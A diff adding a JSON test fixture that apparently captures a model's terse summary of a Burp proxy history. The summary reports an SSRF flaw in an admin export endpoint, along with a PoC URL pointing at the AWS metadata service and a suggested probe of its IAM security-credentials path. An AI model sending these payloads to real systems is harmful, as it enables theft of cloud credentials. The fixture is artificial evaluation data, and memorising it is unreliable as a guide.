@@ -1,0 +1,9 @@
+{
+  "fixture_id": "burp-proxy-history-ssrf",
+  "condition": "caveman",
+  "model": "sonnet",
+  "captured_at": "2026-05-02T21:29:50.439258+00:00",
+  "system_source": "/Users/hs/.claude/plugins/marketplaces/caveman/caveman/SKILL.md",
+  "fixture_fingerprint": "85170afe65c57888",
+  "text": "**project:** customer-portal | **findings:** 1 critical, 1 medium | **history:** 89 items (mostly 200s on `/api/items/{1-89}`, ~8 scattered 401s — noise)\n\n---\n\n**CRITICAL — BURP-CRIT-17: SSRF via export target param**\n- **Endpoint:** `GET /api/admin/export?target=<url>`\n- **PoC:** `GET /api/admin/export?target=http://169.254.169.254/latest/meta-data/iam/`\n- **Response:** 200 — server-side export worker fetches target; AWS IMDS reachable\n- **Clue:** Metadata path `/iam/` → enumerate creds via `/iam/security-credentials/`\n\n**MEDIUM — BURP-MED-04: No rate limit on `/api/invite`**\n\n---\n\n**Next decision:** Confirm IAM creds — probe `?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/` and enumerate role names."
+}
